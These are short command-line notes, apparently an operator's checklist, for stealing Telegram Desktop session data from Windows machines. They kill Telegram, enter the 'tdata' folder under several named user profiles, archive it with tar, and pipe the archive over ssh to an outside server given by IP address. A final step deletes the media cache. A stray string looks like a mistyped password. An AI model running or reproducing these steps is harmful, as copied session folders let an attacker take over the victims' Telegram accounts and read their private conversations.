


kill telegram

taskkill /F /IM Telegram.exe


cd to tdata 

cd "C:\Users\MT-TR-1025\AppData\Roaming\Telegram Desktop\tdata"

cd "C:\Users\user-1028\AppData\Roaming\Telegram Desktop\tdata"

cd "C:\Users\рабочий\AppData\Roaming\Telegram Desktop\tdata"

cd "C:\Users\TR\AppData\Roaming\Telegram Desktop\tdata"

cd "C:\Users\Sale\AppData\Roaming\Telegram Desktop\tdata"

cd "C:\Users\user\AppData\Roaming\Telegram Desktop\tdata"


archive 

tar -a -c -f C:\tmp.zip *





copy to server 

type C:\tmp.zip | ssh turborand@80.87.103.215 "cat > /tmp/tmp.zip"

Lfi,jhl




delete cache 

del /f /s /q "C:\Users\user\AppData\Roaming\Telegram Desktop\tdata\user_data\media_cache\*" >nul 2>nul & for /d %D in ("C:\Users\user\AppData\Roaming\Telegram Desktop\tdata\user_data\mediacache\*") do rd /s /q "%D" >nul 2>nul